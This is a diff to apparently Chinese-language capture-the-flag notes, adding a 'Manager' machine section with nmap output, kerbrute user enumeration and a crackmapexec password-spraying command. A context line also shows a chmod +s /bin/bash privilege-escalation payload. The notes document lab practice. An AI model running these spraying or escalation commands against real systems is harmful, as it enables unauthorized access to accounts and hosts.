@@ -493,6 +493,29 @@ echo '[{hosts: localhost, tasks: [shell: /usr/bin/chmod +s /bin/bash]}]' >> /opt
 ## Medium
 ### Manager
 #### user
+- nmap
+```text
+Nmap scan report for 10.10.11.236
+Host is up (0.47s latency).
+Not shown: 992 filtered ports
+PORT    STATE SERVICE
+53/tcp  open  domain
+80/tcp  open  http
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+389/tcp open  ldap
+445/tcp open  microsoft-ds
+464/tcp open  kpasswd5
+636/tcp open  ldapssl
+```
+
+还有个88端口的kerberos-sec没扫出来
+
+使用[kerbrute](https://github.com/ropnop/kerbrute)枚举ad域里的用户
+得到user.txt
+
+使用crackmapexec进行密码喷射(password spraying)
+`crackmapexec smb manager.htb -u users -p passwords`
 
 ### Sandworm
 #### user
